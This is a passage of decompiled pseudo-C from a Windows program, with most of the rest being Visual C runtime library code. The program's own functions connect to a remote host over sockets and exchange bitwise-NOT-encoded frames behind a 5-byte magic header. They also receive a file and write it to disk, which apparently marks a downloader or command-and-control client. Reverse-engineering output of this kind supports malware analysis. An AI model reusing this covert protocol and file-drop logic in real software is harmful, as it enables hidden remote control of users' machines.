  _Memory = (uint *)_malloc(0x10000);
  FUN_00409600(_Memory,0,0x10000);
  local_c14 = 0x10000;
  local_808 = 0;
  FUN_00409600(local_806,0,0x7fe);
  local_c10 = 0;
  local_c0c[0] = 0;
  iVar1 = FUN_004047e0(param_1,param_2,&local_c10,&local_808);
  if (((((iVar1 != 0) &&
        (iVar1 = FUN_004049c0(&local_c10,0xbb9,local_c08,0x200,&local_808), iVar1 != 0)) &&
       (_Memory != (uint *)0x0)) &&
      ((iVar1 = FUN_00404db0(&local_c10,local_c0c,_Memory,&local_c14,&local_808), iVar1 != 0 &&
       (local_c0c[0] == 0xbb9)))) && (local_c14 != 0)) {
    FUN_00409600((uint *)&DAT_0041c3a8,0,0x578);
    local_c18 = 0;
    for (local_c1c = 0; (int)(local_c1c + 0x118) <= (int)local_c14; local_c1c = local_c1c + 0x118) {
      _Src = (wchar_t *)((uint)local_c1c + (int)_Memory);
      if ((*_Src != L'\0') && (local_c18 < 5)) {
        _wcscpy_s(&DAT_0041c3a8 + (uint)local_c18 * 0x8c,0x7f,_Src);
        _memcpy_s(&DAT_0041c4ac + (uint)local_c18 * 0x118,0x14,_Src + 0x82,0x14);
        *(undefined4 *)(&DAT_0041c4a8 + (uint)local_c18 * 0x118) = *(undefined4 *)(_Src + 0x80);
        local_c18 = local_c18 + 1;
      }
    }
  }
  if (_Memory != (uint *)0x0) {
    FID_conflict__free(_Memory);
  }
  FUN_00404990(&local_c10);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_004047e0(undefined4 param_1,undefined2 param_2,int *param_3,undefined2 *param_4)

{
  bool bVar1;
  int iVar2;
  undefined2 *local_9b8;
  int local_9b0;
  undefined local_9ac [400];
  undefined2 local_81c;
  undefined2 local_81a;
  undefined4 local_818;
  undefined4 local_80c;
  undefined2 local_808;
  uint local_806 [511];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_808 = 0;
  FUN_00409600(local_806,0,0x7fe);
  local_9b8 = &local_808;
  if (param_4 != (undefined2 *)0x0) {
    local_9b8 = param_4;
  }
  *local_9b8 = 0;
  local_80c = 0;
  bVar1 = false;
  iVar2 = Ordinal_115(0x101,local_9ac,0);
  if (iVar2 == 0) {
    iVar2 = Ordinal_23(2,1,6);
    *param_3 = iVar2;
    if (*param_3 != -1) {
      local_9b0 = Ordinal_52(param_1);
      if (local_9b0 == 0) {
        local_80c = Ordinal_11(param_1);
        local_9b0 = Ordinal_51(&local_80c,4,2);
      }
      if (local_9b0 != 0) {
        local_818 = *(undefined4 *)**(undefined4 **)(local_9b0 + 0xc);
        local_81c = 2;
        local_81a = Ordinal_9(param_2);
        iVar2 = Ordinal_4(*param_3,&local_81c,0x10);
        if (iVar2 == 0) {
          bVar1 = true;
        }
      }
      if ((!bVar1) && (*param_3 != 0)) {
        Ordinal_3(*param_3);
        *param_3 = 0;
      }
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 __cdecl FUN_00404990(int *param_1)

{
  int iVar1;
  
  if (*param_1 != 0) {
    iVar1 = Ordinal_3(*param_1);
    if (iVar1 != 0) {
      return 0;
    }
    *param_1 = 0;
  }
  return 1;
}



void __cdecl
FUN_004049c0(int *param_1,undefined2 param_2,void *param_3,size_t param_4,undefined2 *param_5)

{
  int iVar1;
  size_t local_818;
  undefined2 *local_814;
  size_t local_810;
  undefined2 *local_80c;
  undefined2 local_808;
  uint local_806 [511];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_808 = 0;
  FUN_00409600(local_806,0,0x7fe);
  local_814 = &local_808;
  local_80c = (undefined2 *)0x0;
  if (param_5 != (undefined2 *)0x0) {
    local_814 = param_5;
  }
  *local_814 = 0;
  if (*param_1 != 0) {
    if (0xfffa < (int)param_4) {
      param_4 = 0xfffa;
    }
    local_80c = (undefined2 *)operator_new(0x1000);
    local_810 = param_4;
    if (0xffa < (int)param_4) {
      local_810 = 0xffa;
    }
    *local_80c = param_2;
    *(size_t *)(local_80c + 1) = param_4;
    if ((param_3 == (void *)0x0) && (param_4 == 0)) {
      FUN_00404c60(param_1,local_80c,local_810 + 6);
    }
    else {
      FID_conflict__memcpy(local_80c + 3,param_3,local_810);
      iVar1 = FUN_00404c60(param_1,local_80c,local_810 + 6);
      if (iVar1 != 0) {
        for (; (int)local_810 < (int)param_4; local_810 = local_810 + local_818) {
          if ((int)(param_4 - local_810) < 0x1001) {
            local_818 = param_4 - local_810;
          }
          else {
            local_818 = 0x1000;
          }
          FID_conflict__memcpy(local_80c,(void *)((int)param_3 + local_810),local_818);
          iVar1 = FUN_00404c60(param_1,local_80c,local_818);
          if (iVar1 == 0) break;
        }
      }
    }
  }
  if (local_80c != (undefined2 *)0x0) {
    FID_conflict__free(local_80c);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 __cdecl FUN_00404c60(int *param_1,void *param_2,size_t param_3)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 local_18;
  int local_c;
  short *local_8;
  
  uVar3 = 0;
  uVar2 = 0;
  local_18 = 0;
  local_8 = (short *)0x0;
  if (*param_1 != 0) {
    for (local_c = 0; local_c < (int)param_3; local_c = local_c + 1) {
      *(byte *)((int)param_2 + local_c) = ~*(byte *)((int)param_2 + local_c);
    }
    local_8 = (short *)operator_new(param_3 + 7);
    *local_8 = (short)param_3 + 5;
    *(undefined4 *)(local_8 + 1) = DAT_0041af10;
    *(undefined *)(local_8 + 3) = DAT_0041af14;
    FID_conflict__memcpy((void *)((int)local_8 + 7),param_2,param_3);
    iVar1 = Ordinal_19(*param_1,local_8,param_3 + 7,0,uVar2,uVar3);
    if ((iVar1 != -1) && (iVar1 == param_3 + 7)) {
      local_18 = 1;
    }
  }
  if (local_8 != (short *)0x0) {
    FID_conflict__free(local_8);
  }
  return local_18;
}



void __cdecl
FUN_00404db0(int *param_1,undefined2 *param_2,void *param_3,size_t *param_4,undefined2 *param_5)

{
  int iVar1;
  int iVar2;
  undefined2 *local_81c;
  size_t local_818;
  undefined2 *local_814;
  size_t local_810;
  size_t local_80c;
  undefined2 local_808;
  uint local_806 [511];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_808 = 0;
  FUN_00409600(local_806,0,0x7fe);
  local_81c = &local_808;
  if (param_5 != (undefined2 *)0x0) {
    local_81c = param_5;
  }
  *local_81c = 0;
  local_814 = (undefined2 *)0x0;
  local_80c = 0;
  local_810 = 0;
  if ((*param_1 != 0) && (param_3 != (void *)0x0)) {
    local_80c = 0x1000;
    local_814 = (undefined2 *)operator_new(0x1000);
    iVar1 = FUN_00405130(param_1,local_814,&local_80c,local_81c);
    if ((iVar1 != 0) && (local_80c = local_80c - 6, -1 < (int)local_80c)) {
      *param_2 = *local_814;
      iVar1 = *(int *)(local_814 + 1);
      if ((int)*param_4 < (int)local_80c) {
        if (0 < (int)*param_4) {
          FID_conflict__memcpy(param_3,local_814 + 3,*param_4);
          local_810 = *param_4;
        }
      }
      else {
        FID_conflict__memcpy(param_3,local_814 + 3,local_80c);
        local_810 = local_80c;
      }
      for (local_818 = local_80c; (int)local_818 < iVar1; local_818 = local_818 + local_80c) {
        local_80c = 0x1000;
        iVar2 = FUN_00405130(param_1,local_814,&local_80c,local_81c);
        if ((iVar2 == 0) || (0x10000 < (int)(local_818 + local_80c))) goto LAB_004050c0;
        if ((int)*param_4 < (int)(local_810 + local_80c)) {
          if ((int)local_810 < (int)*param_4) {
            FID_conflict__memcpy((void *)((int)param_3 + local_810),local_814,*param_4 - local_810);
            local_810 = *param_4;
          }
        }
        else {
          FID_conflict__memcpy((void *)((int)param_3 + local_810),local_814,local_80c);
          local_810 = local_810 + local_80c;
        }
      }
      *param_4 = local_810;
    }
  }
LAB_004050c0:
  if (local_814 != (undefined2 *)0x0) {
    FID_conflict__free(local_814);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00405130(int *param_1,void *param_2,size_t *param_3,undefined2 *param_4)

{
  ushort uVar1;
  int iVar2;
  size_t _Size;
  undefined2 *local_8f4;
  int local_8e4;
  void *local_8d8;
  int local_8d4;
  undefined2 local_8d0;
  uint local_8ce [511];
  undefined local_d0 [200];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_8d0 = 0;
  FUN_00409600(local_8ce,0,0x7fe);
  local_8f4 = &local_8d0;
  if (param_4 != (undefined2 *)0x0) {
    local_8f4 = param_4;
  }
  *local_8f4 = 0;
  local_8d8 = (void *)0x0;
  if ((*param_1 != 0) && (param_2 != (void *)0x0)) {
    local_d0._0_2_ = local_d0._0_2_ & 0xff00;
    FUN_00409600((uint *)(local_d0 + 1),0,199);
    iVar2 = Ordinal_16(*param_1,local_d0,2,0);
    uVar1 = local_d0._0_2_;
    if ((iVar2 != -1) && (iVar2 != 0)) {
      local_8d4 = 0;
      local_8d8 = operator_new((ushort)local_d0._0_2_ + 2);
      for (; local_8d4 < (int)(uint)uVar1; local_8d4 = local_8d4 + iVar2) {
        iVar2 = Ordinal_16(*param_1,(int)local_8d8 + local_8d4,(uint)uVar1 - local_8d4,0);
        if ((iVar2 == -1) || (iVar2 == 0)) {
          Ordinal_111();
          goto LAB_00405409;
        }
      }
      if (4 < local_8d4) {
        _Size = local_8d4 - 5;
        iVar2 = _memcmp(&DAT_0041af10,local_8d8,5);
        if (iVar2 == 0) {
          for (local_8e4 = 0; local_8e4 < (int)_Size; local_8e4 = local_8e4 + 1) {
            *(byte *)((int)local_8d8 + local_8e4 + 5) = ~*(byte *)((int)local_8d8 + local_8e4 + 5);
          }
          if ((int)*param_3 < (int)_Size) {
            FID_conflict__memcpy(param_2,(void *)((int)local_8d8 + 5),*param_3);
          }
          else {
            FID_conflict__memcpy(param_2,(void *)((int)local_8d8 + 5),_Size);
            *param_3 = _Size;
          }
        }
      }
    }
  }
LAB_00405409:
  if (local_8d8 != (void *)0x0) {
    FID_conflict__free(local_8d8);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00405480(wchar_t *param_1,undefined4 param_2,undefined2 param_3,int param_4)

{
  wchar_t wVar1;
  uint *_Memory;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  wchar_t *local_e30;
  wchar_t *local_e24;
  size_t local_e1c;
  short local_e18 [2];
  int local_e14;
  undefined2 local_e10;
  uint local_e0e [511];
  undefined local_610 [1024];
  WCHAR local_210;
  uint local_20e [129];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  FUN_00409600((uint *)local_610,0,0x400);
  _wcscpy_s((wchar_t *)local_610,0x1ff,param_1);
  local_e24 = param_1;
  do {
    wVar1 = *local_e24;
    local_e24 = local_e24 + 1;
  } while (wVar1 != L'\0');
  puVar3 = &DAT_0041c920;
  puVar4 = (undefined4 *)(local_610 + ((int)local_e24 - (int)(param_1 + 1) >> 1) * 2 + 2);
  for (iVar2 = 0x80; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar4 = *puVar3;
    puVar3 = puVar3 + 1;
    puVar4 = puVar4 + 1;
  }
  local_e30 = param_1;
  do {
    wVar1 = *local_e30;
    local_e30 = local_e30 + 1;
  } while (wVar1 != L'\0');
  _Memory = (uint *)_malloc(0x10000);
  FUN_00409600(_Memory,0,0x10000);
  local_e1c = 0x10000;
  local_e10 = 0;
  FUN_00409600(local_e0e,0,0x7fe);
  local_e14 = 0;
  local_e18[0] = 0;
  local_210 = L'\0';
  FUN_00409600(local_20e,0,0x206);
  if (param_4 == 0) {
    FUN_004057d0(&local_210);
    _wcscat_s(&local_210,0x103,(wchar_t *)&DAT_00418b60);
  }
  else {
    GetTempPathW(0x104,&local_210);
  }
  iVar2 = FUN_004047e0(param_2,param_3,&local_e14,&local_e10);
  if ((((iVar2 != 0) &&
       (iVar2 = FUN_004049c0(&local_e14,0xbba,local_610,
                             ((int)local_e30 - (int)(param_1 + 1) >> 1) * 2 + 0x202,&local_e10),
       iVar2 != 0)) &&
      (iVar2 = FUN_00404db0(&local_e14,local_e18,_Memory,&local_e1c,&local_e10), iVar2 != 0)) &&
     (((local_e18[0] == 0xbba && (local_e1c != 0)) && (*(char *)_Memory == '\0')))) {
    _wcscat_s(&local_210,0x104,&DAT_0041c1a0);
    FUN_00405850(&local_e14,&local_210);
  }
  if (_Memory != (uint *)0x0) {
    FID_conflict__free(_Memory);
  }
  FUN_00404990(&local_e14);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_004057d0(wchar_t *param_1)

{
  undefined2 *puVar1;
  WCHAR local_210 [260];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  GetModuleFileNameW((HMODULE)0x0,local_210,0x104);
  puVar1 = (undefined2 *)FUN_00402760(local_210,L'\\');
  *puVar1 = 0;
  _wcscpy_s(param_1,0x104,local_210);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void __cdecl FUN_00405850(undefined4 *param_1,wchar_t *param_2)

{
  int iVar1;
  size_t _Count;
  uint local_1014;
  FILE *local_1010;
  uint local_100c;
  undefined local_1008 [4096];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_1010 = (FILE *)0x0;
  local_1014 = 0;
  __wfopen_s(&local_1010,param_2,(wchar_t *)&DAT_00418b64);
  if ((local_1010 != (FILE *)0x0) && (iVar1 = Ordinal_16(*param_1,&local_100c,4,0), iVar1 == 4)) {
    while ((local_1014 < local_100c &&
           (_Count = Ordinal_16(*param_1,local_1008,0x1000,0), _Count != 0))) {
      _fwrite(local_1008,1,_Count,local_1010);
      local_1014 = local_1014 + _Count;
    }
    _fclose(local_1010);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00405970(wchar_t *param_1,wchar_t *param_2)

{
  _vswprintf_s(param_1,0x14,param_2,&stack0x0000000c);
  return;
}



void __cdecl FUN_004059a0(int param_1,wchar_t *param_2,int param_3)

{
  __itow_s(param_1,param_2,10,param_3);
  return;
}



void __cdecl FUN_004059c0(wchar_t *param_1,wchar_t *param_2)

{
  _vswprintf_s(param_1,0x10,param_2,&stack0x0000000c);
  return;
}



void __cdecl FUN_004059f0(char *param_1,char *param_2)

{
  _vsprintf_s(param_1,0x10,param_2,&stack0x0000000c);
  return;
}



// Library Function - Single Match
//  @__security_check_cookie@4
// 
// Library: Visual Studio 2012 Release

void __fastcall ___security_check_cookie_4(int param_1)

{
  if (param_1 == DAT_0041a038) {
    return;
  }
                    // WARNING: Subroutine does not return
  ___report_gsfailure();
}



// Library Function - Single Match
//  ___raise_securityfailure
// 
// Library: Visual Studio 2012 Release

void __cdecl ___raise_securityfailure(EXCEPTION_POINTERS *param_1)

{
  DAT_0041b23c = IsDebuggerPresent();
  FUN_00407833();
  ___crtUnhandledException(param_1);
  if (DAT_0041b23c == 0) {
    FUN_00407833();
  }
  ___crtTerminateProcess(0xc0000409);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___report_gsfailure
// 
// Library: Visual Studio 2012 Release

void __cdecl ___report_gsfailure(void)

{
  code *pcVar1;
  uint uVar2;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 uVar3;
  undefined4 extraout_EDX;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined2 in_ES;
  undefined2 in_CS;
  undefined2 in_SS;
  undefined2 in_DS;
  undefined2 in_FS;
  undefined2 in_GS;
  byte bVar4;
  byte bVar5;
  byte in_AF;
  byte bVar6;
  byte bVar7;
  byte in_TF;
  byte in_IF;
  byte bVar8;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  undefined8 uVar9;
  undefined4 unaff_retaddr;
  
  uVar2 = IsProcessorFeaturePresent(0x17);
  uVar9 = CONCAT44(extraout_EDX,uVar2);
  bVar4 = 0;
  bVar8 = 0;
  bVar7 = (int)uVar2 < 0;
  bVar6 = uVar2 == 0;
  bVar5 = (POPCOUNT(uVar2 & 0xff) & 1U) == 0;
  uVar3 = extraout_ECX;
  if (!(bool)bVar6) {
    pcVar1 = (code *)swi(0x29);
    uVar9 = (*pcVar1)();
    uVar3 = extraout_ECX_00;
  }
  _DAT_0041b018 = (undefined4)((ulonglong)uVar9 >> 0x20);
  _DAT_0041b020 = (undefined4)uVar9;
  _DAT_0041b030 =
       (uint)(in_NT & 1) * 0x4000 | (uint)(bVar8 & 1) * 0x800 | (uint)(in_IF & 1) * 0x200 |
       (uint)(in_TF & 1) * 0x100 | (uint)(bVar7 & 1) * 0x80 | (uint)(bVar6 & 1) * 0x40 |
       (uint)(in_AF & 1) * 0x10 | (uint)(bVar5 & 1) * 4 | (uint)(bVar4 & 1) |
       (uint)(in_ID & 1) * 0x200000 | (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 |
       (uint)(in_AC & 1) * 0x40000;
  _DAT_0041b034 = &stack0x00000004;
  _DAT_0041af70 = 0x10001;
  _DAT_0041af20 = 0xc0000409;
  _DAT_0041af24 = 1;
  _DAT_0041af30 = 1;
  DAT_0041af34 = 2;
  _DAT_0041af2c = unaff_retaddr;
  _DAT_0041affc = in_GS;
  _DAT_0041b000 = in_FS;
  _DAT_0041b004 = in_ES;
  _DAT_0041b008 = in_DS;
  _DAT_0041b00c = unaff_EDI;
  _DAT_0041b010 = unaff_ESI;
  _DAT_0041b014 = unaff_EBX;
  _DAT_0041b01c = uVar3;
  _DAT_0041b024 = unaff_EBP;
  DAT_0041b028 = unaff_retaddr;
  _DAT_0041b02c = in_CS;
  _DAT_0041b038 = in_SS;
  ___raise_securityfailure((EXCEPTION_POINTERS *)&PTR_DAT_00414258);
  return;
}



// Library Function - Single Match
//  _wcscpy_s
// 
// Library: Visual Studio 2012 Release

errno_t __cdecl _wcscpy_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  int iVar3;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    if (_Src != (wchar_t *)0x0) {
      iVar3 = (int)_Dst - (int)_Src;
      do {
        wVar1 = *_Src;
        *(wchar_t *)(iVar3 + (int)_Src) = wVar1;
        _Src = _Src + 1;
        if (wVar1 == L'\0') break;
        _SizeInWords = _SizeInWords - 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        return 0;
      }
      *_Dst = L'\0';
      piVar2 = __errno();
      iVar3 = 0x22;
      goto LAB_00405b7e;
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  iVar3 = 0x16;
LAB_00405b7e:
  *piVar2 = iVar3;
  FUN_00407ceb();
  return iVar3;
}



// Library Function - Single Match
//  _wcscat_s
// 
// Library: Visual Studio 2012 Release

errno_t __cdecl _wcscat_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  int iVar4;
  int iStack_10;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    pwVar3 = _Dst;
    if (_Src != (wchar_t *)0x0) {
      do {
        if (*pwVar3 == L'\0') break;
        pwVar3 = pwVar3 + 1;
        _SizeInWords = _SizeInWords - 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        iVar4 = (int)pwVar3 - (int)_Src;
        do {
          wVar1 = *_Src;
          *(wchar_t *)(iVar4 + (int)_Src) = wVar1;
          _Src = _Src + 1;
          if (wVar1 == L'\0') break;
          _SizeInWords = _SizeInWords - 1;
        } while (_SizeInWords != 0);
        if (_SizeInWords != 0) {
          return 0;
        }
        *_Dst = L'\0';
        piVar2 = __errno();
        iStack_10 = 0x22;
        goto LAB_00405bdb;
      }
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  iStack_10 = 0x16;
LAB_00405bdb:
  *piVar2 = iStack_10;
  FUN_00407ceb();
  return iStack_10;
}



// Library Function - Single Match
//  __vswprintf_helper
// 
// Library: Visual Studio 2012 Release

int __cdecl
__vswprintf_helper(undefined *param_1,char *param_2,uint param_3,int param_4,undefined4 param_5,
                  undefined4 param_6)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  char **ppcVar4;
  FILE local_24;
  
  local_24._ptr = (char *)0x0;
  ppcVar4 = (char **)&local_24._cnt;
  for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {
    *ppcVar4 = (char *)0x0;
    ppcVar4 = ppcVar4 + 1;
  }
  if (param_4 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
    return -1;
  }
  if ((param_3 != 0) && (param_2 == (char *)0x0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
    return -1;
  }
  local_24._flag = 0x42;
  local_24._base = param_2;
  local_24._ptr = param_2;
  if (param_3 < 0x40000000) {
    local_24._cnt = param_3 * 2;
  }
  else {
    local_24._cnt = 0x7fffffff;
  }
  iVar3 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
  if (param_2 == (char *)0x0) {
    return iVar3;
  }
  if (-1 < iVar3) {
    local_24._cnt = local_24._cnt + -1;
    if (local_24._cnt < 0) {
      uVar2 = FUN_00407dae(0,&local_24);
      if (uVar2 == 0xffffffff) goto LAB_00405d05;
    }
    else {
      *local_24._ptr = '\0';
      local_24._ptr = local_24._ptr + 1;
    }
    local_24._cnt = local_24._cnt + -1;
    if (-1 < local_24._cnt) {
      *local_24._ptr = '\0';
      return iVar3;
    }
    uVar2 = FUN_00407dae(0,&local_24);
    if (uVar2 != 0xffffffff) {
      return iVar3;
    }
  }
LAB_00405d05:
  *(undefined2 *)(param_2 + param_3 * 2 + -2) = 0;
  return (-1 < local_24._cnt) - 2;
}



// Library Function - Single Match
//  __vswprintf_s_l
// 
// Library: Visual Studio 2012 Release

int __cdecl
__vswprintf_s_l(wchar_t *_DstBuf,size_t _DstSize,wchar_t *_Format,_locale_t _Locale,va_list _ArgList
               )

{
  int *piVar1;
  int iVar2;
  
  if (_Format == (wchar_t *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
    return -1;
  }
  if ((_DstBuf == (wchar_t *)0x0) || (_DstSize == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
  }
  else {
    iVar2 = __vswprintf_helper(FUN_00407efb,(char *)_DstBuf,_DstSize,(int)_Format,_Locale,_ArgList);
    if (iVar2 < 0) {
      *_DstBuf = L'\0';
    }
    if (iVar2 != -2) {
      return iVar2;
    }
    piVar1 = __errno();
    *piVar1 = 0x22;
  }
  FUN_00407ceb();
  return -1;
}



// Library Function - Single Match
//  _vswprintf_s
// 
// Library: Visual Studio 2012 Release

int __cdecl _vswprintf_s(wchar_t *_Dst,size_t _SizeInWords,wchar_t *_Format,va_list _ArgList)

{
  int iVar1;
  
  iVar1 = __vswprintf_s_l(_Dst,_SizeInWords,_Format,(_locale_t)0x0,_ArgList);
  return iVar1;
}



// Library Function - Single Match
//  __wfopen_s
// 
// Library: Visual Studio 2012 Release

errno_t __cdecl __wfopen_s(FILE **_File,wchar_t *_Filename,wchar_t *_Mode)

{
  int *piVar1;
  FILE *pFVar2;
  int iVar3;
  
  if (_File == (FILE **)0x0) {
    piVar1 = __errno();
    iVar3 = 0x16;
    *piVar1 = 0x16;
    FUN_00407ceb();
  }
  else {
    pFVar2 = __wfsopen(_Filename,_Mode,0x80);
    *_File = pFVar2;
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      iVar3 = *piVar1;
    }
    else {
      iVar3 = 0;
    }
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __wfsopen
// 
// Library: Visual Studio 2012 Release

FILE * __cdecl __wfsopen(wchar_t *_Filename,wchar_t *_Mode,int _ShFlag)

{
  int *piVar1;
  FILE *pFVar2;
  undefined local_14 [8];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00418d20;
  uStack_c = 0x405dfd;
  if (((_Filename == (wchar_t *)0x0) || (_Mode == (wchar_t *)0x0)) || (*_Mode == L'\0')) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
  }
  else {
    pFVar2 = __getstream();
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      *piVar1 = 0x18;
    }
    else {
      local_8 = (undefined *)0x0;
      if (*_Filename != L'\0') {
        pFVar2 = __wopenfile(_Filename,_Mode,_ShFlag,pFVar2);
        local_8 = (undefined *)0xfffffffe;
        FUN_00405eb3();
        return pFVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x16;
      __local_unwind4(&DAT_0041a038,(int)local_14,0xfffffffe);
    }
  }
  return (FILE *)0x0;
}



void FUN_00405eb3(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



// Library Function - Single Match
//  __fread_nolock_s
// 
// Library: Visual Studio 2012 Release

size_t __cdecl
__fread_nolock_s(void *_DstBuf,size_t _DstSize,size_t _ElementSize,size_t _Count,FILE *_File)

{
  int iVar1;
  uint uVar2;
  int *piVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  LPWSTR pWVar7;
  uint local_10;
  uint local_c;
  LPWSTR local_8;
  
  if (_ElementSize == 0) {
    return 0;
  }
  if (_Count == 0) {
    return 0;
  }
  if (_DstBuf == (void *)0x0) {
LAB_00405ee1:
    piVar3 = __errno();
    *piVar3 = 0x16;
  }
  else {
    if ((_File == (FILE *)0x0) || ((uint)(0xffffffff / (ulonglong)_ElementSize) < _Count)) {
      if (_DstSize != 0xffffffff) {
        FUN_00409600((uint *)_DstBuf,0,_DstSize);
      }
      if ((_File == (FILE *)0x0) || ((uint)(0xffffffff / (ulonglong)_ElementSize) < _Count))
      goto LAB_00405ee1;
    }
    uVar6 = _ElementSize * _Count;
    uVar2 = uVar6;
    local_8 = (LPWSTR)_DstBuf;
    local_c = _DstSize;
    if ((_File->_flag & 0x10cU) == 0) {
      local_10 = 0x1000;
    }
    else {
      local_10 = _File->_bufsiz;
    }
    while( true ) {
      if (uVar2 == 0) {
        return _Count;
      }
      if ((_File->_flag & 0x10cU) == 0) break;
      uVar4 = _File->_cnt;
      if (uVar4 == 0) break;
      if ((int)uVar4 < 0) {
LAB_00406066:
        _File->_flag = _File->_flag | 0x20;
LAB_0040606a:
        return (uVar6 - uVar2) / _ElementSize;
      }
      if (uVar2 < uVar4) {
        uVar4 = uVar2;
      }
      if (local_c < uVar4) goto LAB_00406040;
      _memcpy_s(local_8,local_c,_File->_ptr,uVar4);
      _File->_cnt = _File->_cnt - uVar4;
      _File->_ptr = _File->_ptr + uVar4;
LAB_00405ffe:
      iVar1 = -uVar4;
      local_8 = (LPWSTR)((int)local_8 + uVar4);
      local_c = local_c - uVar4;
LAB_00406030:
      uVar2 = uVar2 + iVar1;
    }
    if (uVar2 < local_10) {
      uVar4 = FUN_004094b2(_File);
      if (uVar4 == 0xffffffff) goto LAB_0040606a;
      if (local_c != 0) {
        *(char *)local_8 = (char)uVar4;
        local_8 = (LPWSTR)((int)local_8 + 1);
        iVar1 = -1;
        local_c = local_c - 1;
        local_10 = _File->_bufsiz;
        goto LAB_00406030;
      }
    }
    else {
      if (local_10 == 0) {
        uVar4 = 0x7fffffff;
        if (uVar2 < 0x80000000) {
          uVar4 = uVar2;
        }
      }
      else {
        if (uVar2 < 0x80000000) {
          uVar5 = uVar2 % local_10;
          uVar4 = uVar2;
        }
        else {
          uVar5 = (uint)(0x7fffffff % (ulonglong)local_10);
          uVar4 = 0x7fffffff;
        }
        uVar4 = uVar4 - uVar5;
      }
      if (uVar4 <= local_c) {
        pWVar7 = local_8;
        uVar5 = __fileno(_File);
        uVar4 = FUN_00409798(uVar5,pWVar7,uVar4);
        if (uVar4 == 0) {
          _File->_flag = _File->_flag | 0x10;
          goto LAB_0040606a;
        }
        if (uVar4 != 0xffffffff) goto LAB_00405ffe;
        goto LAB_00406066;
      }
    }
LAB_00406040:
    if (_DstSize != 0xffffffff) {
      FUN_00409600((uint *)_DstBuf,0,_DstSize);
    }
    piVar3 = __errno();
    *piVar3 = 0x22;
  }
  FUN_00407ceb();
  return 0;
}



// Library Function - Single Match
//  _fread
// 
// Library: Visual Studio 2012 Release

size_t __cdecl _fread(void *_DstBuf,size_t _ElementSize,size_t _Count,FILE *_File)

{
  size_t sVar1;
  
  sVar1 = _fread_s(_DstBuf,0xffffffff,_ElementSize,_Count,_File);
  return sVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fread_s
// 
// Library: Visual Studio 2012 Release

size_t __cdecl _fread_s(void *_DstBuf,size_t _DstSize,size_t _ElementSize,size_t _Count,FILE *_File)

{
  int *piVar1;
  size_t sVar2;
  
  if ((_ElementSize != 0) && (_Count != 0)) {
    if (_File != (FILE *)0x0) {
      __lock_file(_File);
      sVar2 = __fread_nolock_s(_DstBuf,_DstSize,_ElementSize,_Count,_File);
      FUN_00406122();
      return sVar2;
    }
